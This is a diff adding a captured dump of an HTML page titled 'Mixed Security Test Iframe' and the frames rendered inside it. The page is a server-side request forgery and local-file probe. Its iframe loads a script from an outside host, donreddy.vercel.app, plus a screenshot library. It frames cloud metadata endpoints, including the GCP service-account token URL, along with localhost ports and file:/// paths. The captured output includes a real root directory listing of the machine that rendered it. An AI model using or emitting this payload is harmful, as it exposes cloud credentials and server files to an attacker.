@@ -1,0 +1,59 @@
+--- MAIN PAGE HTML ---
+<!DOCTYPE html><html><head>
+  <title>Mixed Security Test Iframe</title>
+</head>
+<body>
+  <iframe srcdoc="<script src=&quot;https://donreddy.vercel.app&quot;></script><iframe src=&quot;http://instance-data/latest/meta-data/&quot; width=&quot;33%&quot; height=&quot;33%&quot;></iframe><iframe src=&quot;http://127.0.0.1:443/&quot; width=&quot;33%&quot; height=&quot;33%&quot;></iframe><iframe src=&quot;http://127.0.0.1:80/&quot; width=&quot;33%&quot; height=&quot;33%&quot;></iframe><iframe src=&quot;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&quot; title=&quot;GCP Token Test&quot; width=&quot;33%&quot; height=&quot;33%&quot;></iframe><iframe src=&quot;file:///&quot; width=&quot;33%&quot; height=&quot;33%&quot;></iframe><iframe src=&quot;file:///var/www/html/&quot; width=&quot;33%&quot; height=&quot;33%&quot;></iframe>"></iframe>
+
+
+</body></html>
+
+--- OUTER IFRAME (SRCDOC) DOCUMENT HTML ---
+<html><head><script src="https://donreddy.vercel.app"></script><script type="text/javascript" async="" src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"></script></head><body><iframe src="http://instance-data/latest/meta-data/" width="33%" height="33%"></iframe><iframe src="http://127.0.0.1:443/" width="33%" height="33%"></iframe><iframe src="http://127.0.0.1:80/" width="33%" height="33%"></iframe><iframe src="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token" title="GCP Token Test" width="33%" height="33%"></iframe><iframe src="file:///" width="33%" height="33%"></iframe><iframe src="file:///var/www/html/" width="33%" height="33%"></iframe></body></html>
+
+--- Inner iframe 1 (src: chrome-error://chromewebdata/) DOCUMENT HTML ---
+<html><head></head><body></body></html>
+
+--- Inner iframe 2 (src: chrome-error://chromewebdata/) DOCUMENT HTML ---
+<html><head></head><body></body></html>
+
+--- Inner iframe 3 (src: chrome-error://chromewebdata/) DOCUMENT HTML ---
+<html><head></head><body></body></html>
+
+--- Inner iframe 4 (src: chrome-error://chromewebdata/) DOCUMENT HTML ---
+<html><head></head><body></body></html>
+
+--- Inner iframe 5 (src: file:///) DOCUMENT HTML ---
+<html><head><script>start("/");</script>
+<script>addRow("app","app",1,4096,"4.0 kB",1749063514,"6/4/25, 6:58:34 PM");</script>
+<script>addRow("bin","bin",1,4096,"4.0 kB",1749059020,"6/4/25, 5:43:40 PM");</script>
+<script>addRow("bin.usr-is-merged","bin.usr-is-merged",1,0,"0 B",1711875613,"3/31/24, 9:00:13 AM");</script>
+<script>addRow("boot","boot",1,0,"0 B",1713791283,"4/22/24, 1:08:03 PM");</script>
+<script>addRow("dev","dev",1,2720,"2.7 kB",1749057794,"6/4/25, 5:23:14 PM");</script>
+<script>addRow("etc","etc",1,4096,"4.0 kB",1749059024,"6/4/25, 5:43:44 PM");</script>
+<script>addRow("home","home",1,4096,"4.0 kB",1749057799,"6/4/25, 5:23:19 PM");</script>
+<script>addRow("lib","lib",1,4096,"4.0 kB",1749059020,"6/4/25, 5:43:40 PM");</script>
+<script>addRow("lib.usr-is-merged","lib.usr-is-merged",1,0,"0 B",1731555887,"11/14/24, 3:44:47 AM");</script>
+<script>addRow("lib64","lib64",1,40,"40 B",1746564085,"5/6/25, 8:41:25 PM");</script>
+<script>addRow("media","media",1,0,"0 B",1744725896,"4/15/25, 2:04:56 PM");</script>
+<script>addRow("mnt","mnt",1,0,"0 B",1744725896,"4/15/25, 2:04:56 PM");</script>
+<script>addRow("opt","opt",1,4096,"4.0 kB",1749057797,"6/4/25, 5:23:17 PM");</script>
+<script>addRow("proc","proc",1,0,"0 B",1749057789,"6/4/25, 5:23:09 PM");</script>
+<script>addRow("rom","rom",1,364,"364 B",0,"");</script>
+<script>addRow("root","root",1,102,"102 B",1746564232,"5/6/25, 8:43:52 PM");</script>
+<script>addRow("run","run",1,500,"500 B",1749063432,"6/4/25, 6:57:12 PM");</script>
+<script>addRow("sbin","sbin",1,4096,"4.0 kB",1749059019,"6/4/25, 5:43:39 PM");</script>
+<script>addRow("sbin.usr-is-merged","sbin.usr-is-merged",1,0,"0 B",1711875613,"3/31/24, 9:00:13 AM");</script>
+<script>addRow("srv","srv",1,0,"0 B",1744725896,"4/15/25, 2:04:56 PM");</script>
+<script>addRow("sys","sys",1,0,"0 B",1749057789,"6/4/25, 5:23:09 PM");</script>
+<script>addRow("tmp","tmp",1,12288,"12.0 kB",1749063521,"6/4/25, 6:58:41 PM");</script>
+<script>addRow("usr","usr",1,4096,"4.0 kB",1746564059,"5/6/25, 8:40:59 PM");</script>
+<script>addRow("var","var",1,4096,"4.0 kB",1749057793,"6/4/25, 5:23:13 PM");</script>
+<script>addRow(".package-cache-mutate",".package-cache-mutate",0,0,"0 B",1723170801,"8/9/24, 2:33:21 AM");</script>
+</head><body></body></html>
+
+--- Inner iframe 6 (src: chrome-error://chromewebdata/) DOCUMENT HTML ---
+<html><head></head><body></body></html>
+
+--- Inner iframe 7 (src: about:blank) DOCUMENT HTML ---
+Could not access content: Frame.content: Unable to retrieve content because the page is navigating and changing the content.
